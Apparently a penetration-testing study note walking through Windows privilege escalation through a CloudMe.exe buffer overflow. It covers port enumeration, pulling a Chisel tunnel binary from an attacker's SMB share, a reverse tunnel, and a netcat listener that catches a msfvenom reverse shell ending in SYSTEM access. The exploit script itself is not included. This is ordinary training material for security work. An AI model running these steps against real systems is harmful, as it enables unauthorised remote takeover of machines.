# Windows PrivEsc: By Vulnerable Software

If any software has exploit then we misuse it, we call it **Vulnerable Software**.

---

## 1. Enumeration & Identifying Processes

### Run command to list all active connections & listening ports:
`netstat -ano`

* `-a` $\rightarrow$ All connections
* `-n` $\rightarrow$ Name resolution inverse (displays addresses and port numbers in numerical form)
* `-o` $\rightarrow$ Displays the PID (Process ID) associated with each connection

> **Note:** If any suspicious IP with port is running in a Process ID, then copy that **PID**.

### List Processes by PID (CMD):
```
tasklist /fi "PID eq 5748"
```
*(Replace 5748 with your target PID)*

### Find Software running on specific port using PowerShell:
```
Get-NetTCPConnection -LocalPort 8888
```

#### Get Process details from the owning Process ID:
If the software crashes or you need to find the exact executable name dynamically:
```
Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
```

> Now we get the Software with `.exe` name.

### Find Full Path of the File (CMD):
```
dir /S /B *file*
```
*(Use this in CMD to find where the vulnerable program is installed)*

---

## 2. Port Forwarding / Tunneling via Chisel

If the vulnerable service or port is only listening locally (127.0.0.1), we have to do **TCP Tunneling** using **Chisel** to access it from our attacker machine.

### Step 1: Download & Transfer Chisel
* Install chisel on Linux attacker machine: `sudo apt install chisel` (or download binary)
* Transfer `chisel.exe` to Windows target machine using SMB share:

# On Attacker Machine (Start SMB Server)
```
impacket-smbserver Share . -smb2support
```


# On Windows Target Machine
```
cd %temp%
copy \\[IP_of_attacker]\Share\chisel.exe chisel.exe
```

### Step 2: Start Chisel Server (On Attacker Machine)
```
chisel server -p 9000 --reverse
```

### Step 3: Connect Chisel Client (On Windows Target Machine)
```
chisel.exe client [IP_of_attacker]:9000 R:6666:127.0.0.1:8888
```

> This will forward the local port `8888` of the Windows machine to port `6666` on your attacker machine. You can verify the active tunnel using `netstat -plant` on your Linux machine.

## 3. Exploit Architecture 

### The Exploit Mechanism

The exploit targets a Buffer Overflow vulnerability within `CloudMe.exe`.

1. When malicious input hits `127.0.0.1:8888`, the application crashes.
    
2. The instruction pointer is hijacked, redirecting execution to our embedded **Shellcode (Payload)**.
    

### The Shellcode Payload Anatomy

The Python exploit contains a pre-compiled shellcode block (generated typically via `msfvenom`). The payload logic dictates:

- **LHOST:** `<KALI_IP>`
    
- **LPORT:** `4445`
    

Hence, when the shellcode runs on the Windows machine under the context of `CloudMe.exe`, it explicitly instructs the OS kernel to spin up an outbound connection back to the Attacker's machine on port `4445`.

## 4. Exploitation Execution Flow

### Step 1: Spin Up the Netcat Listener

Before executing the script, prepare the handler on Kali to intercept the inbound high-privilege connection:

```
nc -lvnp 4445
```

- `-l`: Listen mode.
    
- `-v`: Verbose output.
    
- `-n`: Do not resolve DNS names (faster execution).
    
- `-p 4445`: Matches the exact **LPORT** specified inside the exploit's shellcode.
    

### Step 2: Fire the Exploit

Execute the Python script, targeting our newly mapped local loopback port:

```
python2 exploit.py
```

> [!WARNING] Python Environment Versioning Conflict If the exploit script is written utilizing Python 2 specific libraries or syntax construct (e.g., raw string socket formatting), executing it via `python3` will break socket delivery, resulting in no shell connection. Ensure explicit runtime selection (`python2`).

### Step 3: Privilege Capture

Because `CloudMe.exe` was initiated by the system administrator, the spawned reverse shell inherits the full privilege context of the parent service:


```
C:\Windows\system32> whoami
nt authority\system
```


---
